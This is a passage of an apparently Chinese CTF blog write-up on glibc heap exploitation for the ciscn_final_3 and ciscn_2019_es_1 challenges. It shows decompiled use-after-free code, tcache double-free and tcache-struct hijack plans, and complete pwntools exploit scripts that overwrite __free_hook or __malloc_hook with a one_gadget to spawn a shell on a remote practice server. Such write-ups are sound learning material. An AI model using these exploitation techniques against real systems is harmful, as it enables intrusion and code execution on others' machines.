class="built_in">id</span>,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#1 -&gt; chunk0</span></span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base - <span class="number">0x250</span>))</span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#2 -&gt; chunk0</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#3 -&gt; tcache struct</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span><span class="comment">#0x3afca0</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(realloc))</span><br><span class="line">one = libc_base + <span class="number">0x4f322</span></span><br><span class="line">new(<span class="number">0x100</span>)<span class="comment">#4 -&gt; tcache struct</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span> +  p64(malloc_hook - <span class="number">8</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">new(<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">5</span>, p64(one) + p64(realloc+<span class="number">8</span>))</span><br><span class="line">new(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h2><h3 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h3><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>C++程序。只有两个功能，新建、释放堆块。数量上限为：24，大小限制为：0x78 。用列表维护，释放操作基于下标定位指针。</p><p>新建完成后会输出堆 fd 内存地址。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>free 没指令指针，造成 UAF ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">my_free</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;input the index&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, (__int64)&amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">24</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_ptr_list[v2]);             <span class="comment">// UAF</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><blockquote><p>刚刚做完<code>[V&amp;N2020 公开赛]easyTHeap</code>利用 tcache 部分基本相同。这道题 chunk 数量上限挺高的，可以通过 free 7 个 chunk 占满空间，可以不需要劫持 tcache 结构体数量标志位。</p></blockquote><ol><li>double free ，劫持 tcache bin 的 chunk0 fd 到 tcache struct 上</li><li>修改 struct 中数量标志位；修改 bin 链头的地址为 chunk0-0x10 ，后面修改 chunk0 size 为 unsorted bin 大小，用来泄露地址；多写几个链头为 chunk0 fd ，后面分配到 main_area 上输出地址</li><li>再次劫持 tcache struct ，改一个链头 free_hook </li></ol><p>获取 chunk0 后面用来计算各个地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gift :&quot;</span>)</span><br><span class="line">chunk0_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;chunk0_addr:&quot;</span>+<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">tcache_struct = chunk0_addr - <span class="number">0x11e60</span></span><br></pre></td></tr></table></figure><p>double free ，写 tcache bin 0x60 链表写入结构体地址；再次申请成功分配到结构体上，劫持结构体数量以及链头地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x50</span>,p64(tcache_struct))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x50</span>,p64(tcache_struct))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x58</span>,(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(chunk0_addr)*<span class="number">2</span>+p64(chunk0_addr-<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><ul><li>劫持链头要一个 chunk0_addr-0x10 用来修改 size ，另外一个 chunk0_addr 用来分配到 main_area 上泄露地址。</li><li>那个 <code>\x00</code> 是 0x70 的位置，这里不覆盖用来再次 tcache bin doublue free 再次劫持结构体。</li></ul><p>做 chunk0 释放到 unsorted bin 绕过，nextchunk inuse 位设置为 1 ，再申请一个防止与 topchunk 合并：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">4</span>,<span class="number">0x38</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))<span class="comment">#orw chunk0 size</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment"># chunk0 free unsortbin 绕过检查 nextchunk inuse 检查，需要为1</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment"># 同上</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x50</span>,p64(<span class="number">0xdeadbeef</span>))<span class="comment"># 防止合并topchunk</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x28</span>,p64(<span class="number">0xdeadbeef</span>))<span class="comment"># chunk0</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,p64(chunk0_addr+<span class="number">0x150</span>))<span class="comment"># create on main_area</span></span><br></pre></td></tr></table></figure><p>再次劫持 tcache 结构体将堆分配到 free_hook 上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,p64(tcache_struct))<span class="comment">#10</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(tcache_struct))<span class="comment">#10</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>,(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(free_hook)*<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./ciscn_final_3&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_final_3&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27718</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;thing\n&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gift :&quot;</span>)</span><br><span class="line">chunk0_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;chunk0_addr:&quot;</span>+<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">tcache_struct = chunk0_addr - <span class="number">0x11e60</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x50</span>,p64(tcache_struct))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x50</span>,p64(tcache_struct))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x58</span>,(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(chunk0_addr)*<span class="number">2</span>+p64(chunk0_addr-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x38</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))<span class="comment">#orw chunk0 size</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment"># chunk0 free unsortbin 绕过检查 nextchunk inuse 检查，需要为1</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment"># 同上</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x50</span>,p64(<span class="number">0xdeadbeef</span>))<span class="comment"># 防止合并topchunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x28</span>,p64(<span class="number">0xdeadbeef</span>))<span class="comment"># chunk0</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,p64(chunk0_addr+<span class="number">0x150</span>))<span class="comment"># create on main_area</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gift :&quot;</span>)</span><br><span class="line">main_area = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;main_area:&quot;</span>+<span class="built_in">hex</span>(main_area))</span><br><span class="line">libc_base = main_area - <span class="number">0x3ebca0</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># 再次劫持tcache struct</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,p64(tcache_struct))<span class="comment">#10</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(tcache_struct))<span class="comment">#10</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>,(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(free_hook)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># free_hook 写入 onegadget</span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4f322</span><span class="comment">#0x4f3c2</span></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x40</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h2><h3 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h3><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>简单堆管理程序，有增删查功能。chunk 上限为 12 个，有 0x18 的结构体，又通过链表管理结构体。结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">void</span> **chunk_ptr;<span class="comment">//8bit</span></span><br><span class="line">    <span class="keyword">size_t</span> size;<span class="comment">//4bit</span></span><br><span class="line">    <span class="keyword">int</span> number;<span class="comment">//(12-1)bit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h3><p>在 free 中，只是单单释放 data chunk ，结构体 chunk 以及对应链表都完整保留，释放 data chunk 时，没有将结构体中对应位置置零，造成 UAF 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">call</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> &amp;&amp; v1 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heap_addr[v1] )</span><br><span class="line">    <span class="built_in">free</span>(*heap_addr[v1]);                       <span class="comment">// UAF</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You try it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>double free 泄露堆地址，劫持 tcache struct ，控制链头分配到 chunk0 size</li><li>free chunk0 到 unsorted bin 泄露 libc 地址</li><li>劫持 free_hook 为 onegadget</li></ol><p>tcache 常规的 double free 泄露地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xc</span>)<span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">chunk_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>修改 tcache bin 中的数量以及链头地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,p64(tcache_addr),<span class="string">&#x27;f&#x27;</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(tcache_addr),<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,(<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">5</span>+<span class="string">&#x27;\x00&#x27;</span>).ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)+p64(tcache_addr)*<span class="number">3</span>+p64(tcache_addr-<span class="number">0x10</span>),<span class="string">&#x27;c&#x27;</span>*<span class="number">0x4</span>+p64(chunk_addr+<span class="number">0x70</span>))<span class="comment">#3</span></span><br></pre></td></tr></table></figure><ul><li>tcahce_addr 方便再次申请 chunk0</li><li>tcache_addr - 0x10 用来修改 chunk0 的 size </li><li>劫持数量标志位保留一个，后面用来 double free</li></ul><p>释放 chunk0 获取 libc 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">main_area = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>再次 double free tcache 将 chunk 分配到 free_hook 上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x48</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook),<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook),<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget),<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 